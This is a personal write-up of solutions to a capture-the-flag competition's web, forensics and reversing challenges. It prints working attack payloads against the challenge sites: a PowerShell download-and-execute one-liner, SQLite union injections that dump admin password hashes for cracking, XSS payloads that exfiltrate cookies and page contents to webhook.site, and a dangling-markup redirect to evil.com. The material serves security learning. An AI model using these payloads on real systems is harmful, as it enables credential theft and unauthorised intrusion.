> The very first ctf where I qualified into the finals :D


Solves: BabySSTI(Web), Shark Lotto(Web), BabySQL(Web), Calculator(Web), Insecure Content(Web), Secure Content(Web), Data compressor(Web), Blahaj Fanpage(Web), Are You A Robot?(Rev), \[DATA EXPUNGED\](Forens), Trashcan Stroll(Forens), Significant bites(Forens), Hidden in plain sight(Misc), Unsafe PDF(Rev)

The writeups will be ordered randomly and generally start with easy challanges/those solved with chatgpt.
## Unsafe pdf
I don't actually know how the javascript code was extracted as the browsers I tried (firefox and edge) did not seem to run anything. The code was given to me by my teammate and thrown into chatgpt to be reversed, giving the flag
https://chatgpt.com/share/67444b9d-5fe0-800e-89ff-0ee8dec3c9a2
`blahaj{PDF_0bj3c7_HuN7}`
## Hidden in plain sight
The flag was said to be hidden within this message
![[Pasted image 20241125180547.png]]
Initially, I wanted to copy the text and use python to extract all capital letters. When pasting the message, I realised the lists were actually numbered uniquely.
![[Pasted image 20241125180752.png]]
This looks suspiciously like the ascii representation of characters, so I made a quick python script to extract that
```python
text = """1. Lets hear a funny story about the shark! See if you can find the hidden flag~ The story starts below ^-^  
98. Haj the shark loved swimming through the deep, blue ocean.  
108. He was known for his unique shimmering scales that glistened in the sunlight.  
97. Every dawn, Haj would race with the school of fish near the coral reef.  
104. The other sea creatures admired his agility and grace underwater.  
97. Even the turtles would cheer as Haj zoomed past them.  
106. Despite his speed, Haj was gentle and friendly to all who crossed his path.  
123. One day, Haj discovered an unusual underwater cave.  
113. Curiosity got the better of him, and he decided to explore it.  
117. Inside the cave were ancient symbols etched on the walls.  
49. Haj felt a strange sense of wonder as he observed the symbols.  
114. He wondered if they held the secrets of the ocean's past.  
107. Excited by his discovery, Haj shared it with his ocean friends.  
121. Together, they tried to decipher the symbols' meanings.  
95. Their exploration brought them closer and forged a new bond among the sea creatures.  
109. As a result, Haj decided to protect this newfound treasure.  
52. The ocean felt different now, more mysterious and alive.  
114. Haj often visited the cave, respecting its ancient beauty.  
107. He felt honored to be the guardian of such a magical place.  
100. In his heart, Haj knew the ocean held many more secrets to uncover.  
48. Each day, he was thankful for the life he led in the ocean.  
119. His adventures continued, swimming through the vast, mysterious sea.  
110. Haj embraced the unknown with excitement and courage.  
95. He found solace in the waves and harmony with the ocean's rhythm.  
114. The ocean was his home, and he vowed to protect it always.  
51. Haj the shark became a legend among the sea creatures.  
110. The tales of his discoveries spread far and wide.  
100. And as the sun set, Haj swam gracefully into the horizon.  
51. His heart filled with joy and anticipation for what lay ahead.  
114. He knew that every day brought a new adventure.  
49. With his friends, Haj would explore the ocean's wonders.  
110. Together, they celebrated their world under the sea.  
103. And so, Haj continued his journey, forever curious and free.  
125. The end."""  
  
lines = text.split("\n")  
nums = [int(line.split(".", 1)[0]) for line in lines]  
print(''.join(chr(x) for x in nums))
```
`blahaj{qu1rky_m4rkd0wn_r3nd3r1ng}`
## Are you a robot?
A challenge where we have to run a random command to prove we are not a robot
![[Pasted image 20241125181525.png]]
Checking the clipboard, we can see what command we are about to run
```ps
cmd /c PowerShell.exe "iex ((New-Object System.Net.WebClient).DownloadString('http://robot.c1.blahaj.sg/captcha.ps1'))" # ✅ ''I am not a robot - reCAPTCHA Verification ID: 3029''
```
Upon running the command, nothing happens.
![[Pasted image 20241125181654.png]]
I was too lazy to reverse engineer the script, so I threw this into https://any.run and used it to extract the code
![[Pasted image 20241125203309.png]]
`blahaj{free_powershell_glitch}`
## \[Data expunged\]
Simply open the pdf in some document editor and delete the black boxes
## Trashcan Stroll
We were told the file is suspiciously huge, so it is safe to assume there might be an embedded file. Analysis in cyberchef shows there is a `flag.txt` string within the file, suggesting there is a zip inside the file
![[Pasted image 20241125203849.png]]
Checking the [file format](https://en.wikipedia.org/wiki/JPEG#Syntax_and_structure) for jpegs, we see that they end with `0xFF, 0xD9`.
![[Pasted image 20241125204149.png]] The charaters `PK` after the EOI bytes, in conjunction with the fact that cyberchef reported pkzips embedded, hint at the kind of embedded file. Sure enough, checking the pkzip file format confirms it, as pkzips start with `0x50,0x4b,0x03,0x04`. Simply crop from those bytes to the end of the file, and we obtain the zip. 
![[Pasted image 20241125204622.png]]
`blahaj{RubbI5h_on_Th3_MoV3}`
## Significant bites
Throw the file into https://www.aperisolve.com/, get the flag
![[Pasted image 20241125204836.png]]
`blahaj{1_W4N73D_70_S33_73H_w0rLD_1N_c0L0R}`
## BabySSTI
The chal hints at jinja ssti, so we know to use `{{}}`. We are told to leak `hakerman`, so we do that.
![[Pasted image 20241125205122.png]]![[Pasted image 20241125205259.png]]
Following that, we use one of the payloads from hacktricks to extract the flag
![[Pasted image 20241125205342.png]]
`blahaj{SsT1_ExpL01T}`
## Shark lotto
We are given the source code for this challenge. Checking out main.py, we see this:
```python
@app.route('/spin', methods=['POST'])  
def spin():  
    bet_amount = request.json.get('bet')  
    money = request.json.get('money')  
    slotImage1 = random.randrange(0, 4)  
    slotImage2 = random.randrange(0, 4)  
    slotImage3 = random.randrange(0, 4)  
  
    if (money >= 13371337):  
        return jsonify({'flag': "blahaj{???}"})
    ...
```
The solution is to just send a post request to `/spin` with 
```json
{"bet":0, "money": 13371337}
```
and we get the flag.
`blahaj{d0n7_7rus7_th3_cl13nt}`
## Babysql
We are given a site where we first need an account before we are able to view products. I had initially (unsuccessfully) tried to inject sql into the registration, login and adminLogin page, before reading the challenge description which hinted the sql injection was to be done in the product search page. The first thing I tried was a simple `or 1=1` statement to ensure sql injection worked.
![[Pasted image 20241125210658.png]]
Additional queries such as `' and 1=0;--` resulted in no results shown, confirming we could inject sql.
![[Pasted image 20241125210832.png]]
Next, we need to extract more information about the database used. This could be done through [union attacks](https://portswigger.net/web-security/sql-injection/union-attacks). The first step is to try to extract information about the fields retrieved when querying for a product. The website displays both the product and its price, so we first try blindly guessing there are 2 fields. `' union select 'a','b';--`
> It is also possible (and probably better) to guess the number of fields by using `order by n`, for example `' order by 4;--` gives an error and we know there are 3 fields.

![[Pasted image 20241125211316.png]]
Unfortunately, we get an error when trying that query. I blindly added another column to the union and thankfully got no error. `' union select 'a','b', 'c';--`
![[Pasted image 20241125211452.png]]
Luckily for us, all the data is returned as strings, so no further guessing was needed. 
> TODO: It turns out selecting integers also works. Not sure if it is due to the way the server handles queries or sql is just like that

Next, we need to extract the table names. Before that, we should try to find what variant of sql is used. Sqlite is lightweight and commonly used, so I googled payloads for sql. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md
`' union select 'a',sqlite_version(),'c';--`
![[Pasted image 20241125212031.png]]
After confirming we are indeed using sqlite, we can use other payloads to obtain the table names
`' UNION SELECT 'a','b',tbl_name FROM sqlite_master WHERE type='table';--`
![[Pasted image 20241125212507.png]]
From there, we can extract the table structure
`' UNION SELECT 'a','b',name FROM PRAGMA_TABLE_INFO('PRIV_USERS')--`
![[Pasted image 20241125212733.png]]
(The table structure was the same for `PRIV_USERS` and `USERS_ZAHSHBSH`)
Now that we know the tables and their structures, we can try extracting data from them thru queries such as `' union SELECT 'a', is_admin,username FROM PRIV_USERS--` and `' union SELECT 'a', password,username FROM PRIV_USERS--`. It was revealed that the users `Cisco`, `Leon` and `Rigby` were all admin, and their passwords looked like this
![[Pasted image 20241125214641.png]]
Initially, I thought those were fixed-length randomly generated passwords and was confused when none of those passwords worked for the admin login page. I was rather lost and spent a bit of time just trying different combinations of usernames and passwords. However, when checking out `USERS_ZAHSHBSH`, all passwords were in the same format, suggesting they were hashed. 
![[Pasted image 20241126212253.png]]
Since I knew my own password, I compared different hashing algorithms and discovered passwords were SHA256 hashed. 
![[Pasted image 20241126212334.png]]With the 3 different accounts, using a password cracker like hashcat could probably recover the password of at least 1 account. Brute forcing the passwords using the [10m wordlist](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt), we can recover 2 passwords.
![[Pasted image 20241125215837.png]]
From there, we can successfully login and get the flag
![[Pasted image 20241125215925.png]]
`blahaj{sQLi_iS_c00l}`
## Calculator
We are given a website where we can evaluate expressions. The goal of the challenge is to exfiltrate a cookie when the admin bot visits this site.
![[Pasted image 20241127104854.png]]
At first I assumed this was a SSTI challenge, and tried identifying the server by trying various expressions. I first tried parenthesis, which seemed to be blacklisted
![[Pasted image 20241127105527.png]]
I then tried an array, which interestingly worked.
![[Pasted image 20241127105220.png]]
Adding an array and a number together also worked, which hinted at javascript being used
![[Pasted image 20241127110009.png]]
^ javascript jank
Next, we should test the capabilities of the javascript runtime used. I tried the expression `document.cookie`, which returned `undefined`. I then tried setting `window.location`, however some character was blacklisted
![[Pasted image 20241127111314.png]]
By testing various string literals, I was able to use (\`)  to create strings
![[Pasted image 20241127111458.png]]![[Pasted image 20241127111515.png]]
By using an expression like
```javascript
window.location=`lol`
```
, I was redirected successfully.
![[Pasted image 20241127111921.png]]
 At this point I realized the challenge was not about SSTI since the javascript was executed in the browser. Knowing this, I blindly constructed a payload to exfiltrate the document cookie
```javascript
window.location=`https://webhook.site/...?`+document.cookie 
```
By submitting the payload to the bug report url, we are able to get the flag
`http://calculator.c1.blahaj.sg/calculate?expression=window.location%3D%60https%3A%2F%2Fwebhook.site%2F...%3F%60%2Bdocument.cookie`
![[Pasted image 20241127112406.png]]
`blahaj{3VaL_i5_WeIrD}`
> In hindsight, we were told the flag was found in cookies, which should have hinted at XSS instead of SSTI. If I had bothered looking at the html, I would've even found the eval expression: 
```html
<div class="container">
        <h1 class="text-center">Calculation Result</h1>
        <p class="text-center">Expression: <strong>1+2</strong></p>
        
            <p class="text-center">Result: <span id="result" class="font-weight-bold">3</span></p>
            <script>
                try {
                    const result = eval(1+2);
                    document.getElementById('result').innerText = result;
                } catch (error) {
                    document.getElementById('result').innerText = 'Error in expression';
                }
            </script>
        
        <div class="text-center">
            <button onclick="window.history.back();" class="btn btn-secondary">Go Back</button>
        </div>
    </div>
```
## Insecure content
We are given the source code for this challenge. This is yet another XSS challenge where the text you input will be reflected in html.
The vulnerable function is `generate_page()`, which concatenates the user input without any escaping
```python
def generatenamepage(name):  
    # TODO Xss vuln here. However there is csp.  
    return """<!DOCTYPE html>  
    <html lang="en">    <head>        <meta charset="UTF-8">        <meta name="viewport" content="width=device-width, initial-scale=1.0">        <title>Hello!</title>            </head>  
    <body>        <div>            <h1>Hello, """+name+"""!</h1>  
            <p>I hope you like flags! In fact, here is a flag: blahaj{[FLAG REDACTED]}</p>            <p>Sadly, only the admin bot can see it :'(</p>        </div>    </body>    </html>"""
```
Unfortunately, there is quite an extensive list of CSPs added to every response by the server.
```python
@app.after_request  
def apply_csp(response: Response) -> Response:  
    csp = (  
        "connect-src 'none'; "  
        "font-src 'none'; "        "frame-src 'none'; "        "img-src 'self'; "        "manifest-src 'none'; "        "media-src 'none'; "        "object-src 'none'; "        "worker-src 'none'; "        "style-src 'self'; "        "frame-ancestors 'none'; "        "block-all-mixed-content;"        "require-trusted-types-for 'script';"    )  
    response.headers['Content-Security-Policy'] = csp
```
Throwing the CSP into a [CSP checker](https://csp-evaluator.withgoogle.com/), we see that the `script-src` policy is missing, meaning any script, including injected scripts, will run.
![[Pasted image 20241126213045.png]]
We begin crafting a payload and testing it. First, a simple payload to ensure XSS works.
![[Pasted image 20241126213554.png]]
> While testing, I had also tried using malformed script tags to attempt capturing the rest of the webpage as a string and sending a request with that string. While it did not seem to work, this experiment would prove useful in the following challenge [[#Secure content]]

Following that, I tried to extract the flag from the page.
```html
<script>  
    setTimeout(()=>alert(Array.from(document.getElementsByTagName("p"))[0].innerHTML), 100)  
</script>
```
> The timeout is to ensure the script is run after the rest of the page is loaded. This could probably be done with some dom event listener but I was lazy

![[Pasted image 20241126214436.png]]
Next, we have to exfiltrate the flag. I tried using `navigator.sendBeacon` but that was blocked by the csp.
```javascript
<script>  
    setTimeout(()=>navigator.sendBeacon("https://webhook.site/...?"+Array.from(document.getElementsByTagName("p"))[0].innerHTML), 100)  
</script>
```
![[Pasted image 20241126214659.png]]
We could also try redirects, however the admin block will prevent that:
```javascript
...
// blocks cross-origin redirects  
await page.setRequestInterception(true);  
// Prevents any redirections out of the site  
page.on('request', request => {  
    requestURLObj = new URL(request.url())  
    if (request.isNavigationRequest() && (requestURLObj.origin != urlObj.origin)) {  
      request.abort();  
      console.log('uh oh')  
      console.log(requestURLObj)  
    } else {  
        console.log('all good')  
        request.continue();  
    }  
});   
await page.goto(url);
...
```
It should be noted that the bot specifically blocks navigation requests(E.g. redirects) out of the page, but the bot does not block new tabs from being created. We can exploit that by using `window.open()`
```html
<script>  
    setTimeout(()=>window.open("https://webhook.site/...?"+Array.from(document.getElementsByTagName("p"))[0].innerHTML), 100)  
</script>
```
![[Pasted image 20241126215135.png]]
All that is left is to submit that payload to the `/report` endpoint, where the admin bot will visit that site and view the version of the page with the actual flag.
`http://127.0.0.1:8000/greet?name=%3Cscript%3E+++++setTimeout%28%28%29%3D%3Ewindow.open%28%22https%3A%2F%2Fwebhook.site%2F73f9aac1-f3cc-4784-bec3-1615d26a4031%3F%22%2BArray.from%28document.getElementsByTagName%28%22p%22%29%29%5B0%5D.innerHTML%29%2C+500%29+%3C%2Fscript%3E`
`blahaj{n0t_50_s3cuRe_1sit}`

## Secure content
This challenge is similar to [[#Insecure content]], with the following changes
1. The `script-src` policy is now present
```python
   @app.after_request  
def apply_csp(response: Response) -> Response:  
    csp = (  
        "connect-src 'none'; "  
        "font-src 'none'; "        "frame-src 'none'; "        "img-src 'self'; "        "manifest-src 'none'; "        "media-src 'none'; "        "object-src 'none'; "        "script-src 'none'; "        "worker-src 'none'; "        "style-src 'self'; "        "frame-ancestors 'none'; "        "block-all-mixed-content;"        "require-trusted-types-for 'script';"    )  
    response.headers['Content-Security-Policy'] = csp  
    return response
```
2. Puppeteer is no longer used. As such, redirects are now allowed
```python
@app.route('/adminbot', methods=['POST'])  
def adminbot():  
    url = request.form.get('url')  
  
    if not url or not url.startswith('http://'+ipport+'/'):  
        return "Invalid URL. It must start with 'http://"+ipport+"/'.", 400  
  
    command = f"chromium --virtual-time-budget=10000 --no-sandbox --headless --disable-gpu --timeout=5000 {shlex.quote(url)}"  
    subprocess.Popen(command, shell=True)  
    return "Admin bot will see your request soon"
```
For this challenge, I drew some inspiration from Insecure content, where I had previously tried a form of [dangling markup](https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection). Due to the CSP, images can only originate from the server, so using images to exfiltrate data won't work. However, the website also suggests using `meta` tags to change the window location, which fits with redirects now being allowed. By testing their payload, we see it indeed does work
```html
<meta http-equiv="refresh" content='60; URL=http://evil.com/log.cgi?
```
> Interestingly, double quotes did not seem to work. 

```html
...
<p>Hello, <meta http-equiv="refresh" content="60; URL=http://evil.com/log.cgi?! I hope you like flags! In fact, here is a flag: blahaj{[FLAG REDACTED]}. Sadly, only the admin bot can see it :" (<p="">
        </p>
```
Thus, we can craft a payload that redirects to our website and extract the flag from there
`http://securecontent.c1.blahaj.sg/greet?name=%3Cmeta+http-equiv%3D%22refresh%22+content%3D%275%3BURL%3Dhttps%3A%2F%2Fwebhook.site%2F...%3F`
![[Pasted image 20241127123149.png]]
`blahaj{D4nG13_tH3_MArKuP}`
## Blahaj fanpage
Honestly, I did not find this challenge fun as it was quite guessy.
TODO
## Data compressor
TODO